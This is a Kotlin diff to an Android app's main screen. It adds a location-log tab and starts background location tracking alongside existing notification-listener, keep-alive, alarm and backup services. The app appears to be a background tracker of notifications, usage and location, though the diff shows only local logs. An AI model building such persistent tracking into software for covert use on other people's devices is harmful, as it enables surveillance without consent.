@@ -138,7 +138,17 @@ class MainActivity : AppCompatActivity() {
             btnTabLogs.backgroundTintList = getColorStateList(android.R.color.darker_gray)
             refreshUsageLogs()
         }
-
+        btnTabLocation.setOnClickListener {
+    containerPermissions.visibility = View.GONE
+    containerLogs.visibility = View.GONE
+    containerUsage.visibility = View.GONE
+    containerLocation.visibility = View.VISIBLE
+    btnTabLocation.backgroundTintList = getColorStateList(android.R.color.holo_green_dark)
+    btnTabPermissions.backgroundTintList = getColorStateList(android.R.color.darker_gray)
+    btnTabLogs.backgroundTintList = getColorStateList(android.R.color.darker_gray)
+    btnTabUsage.backgroundTintList = getColorStateList(android.R.color.darker_gray)
+    refreshLocationLogs()
+}
         findViewById<Button>(R.id.btnRefreshUsage).setOnClickListener { refreshUsageLogs() }
         findViewById<Button>(R.id.btnClearUsage).setOnClickListener {
             dbHelper.writableDatabase.execSQL("DELETE FROM usage_logs")
@@ -333,15 +343,24 @@ class MainActivity : AppCompatActivity() {
             startAllServices()
             Toast.makeText(this, "Background Trackers Started!", Toast.LENGTH_SHORT).show()
         }
-
+        
         findViewById<Button>(R.id.btnRefresh).setOnClickListener { refreshLogs() }
         findViewById<Button>(R.id.btnClear).setOnClickListener {
             dbHelper.writableDatabase.execSQL("DELETE FROM logs")
             refreshLogs()
             Toast.makeText(this, "Local logs cleared!", Toast.LENGTH_SHORT).show()
         }
+        findViewById<Button>(R.id.btnRefreshLocation).setOnClickListener { refreshLocationLogs() }
+        findViewById<Button>(R.id.btnClearLocation).setOnClickListener {
+        dbHelper.writableDatabase.execSQL("DELETE FROM location_logs")
+        refreshLocationLogs()
+        Toast.makeText(this, "Local location logs cleared!", Toast.LENGTH_SHORT).show()
     }
-
+    }
+    private fun refreshLocationLogs() {
+    val logs = dbHelper.getAllLocationLogs()
+    locationLogTextView.text = if (logs.isNotEmpty()) logs else "No location data yet."
+}
     private fun updateDashboardUI() {
         val notifEnabled = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")?.contains(packageName) == true
         updateBtn(btnPermNotif, notifEnabled, "Notification Access")
@@ -400,7 +419,7 @@ class MainActivity : AppCompatActivity() {
         startService(Intent(this, NotificationService::class.java))
         startService(Intent(this, KeepAliveService::class.java))
         AlarmScheduler.scheduleAlarms(this)
-        
+        LocationWorker.startLocationTracking(this)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
             val jobScheduler = getSystemService(Context.JOB_SCHEDULER_SERVICE) as android.app.job.JobScheduler
             val job = android.app.job.JobInfo.Builder(1005, ComponentName(this, BackupJobService::class.java))
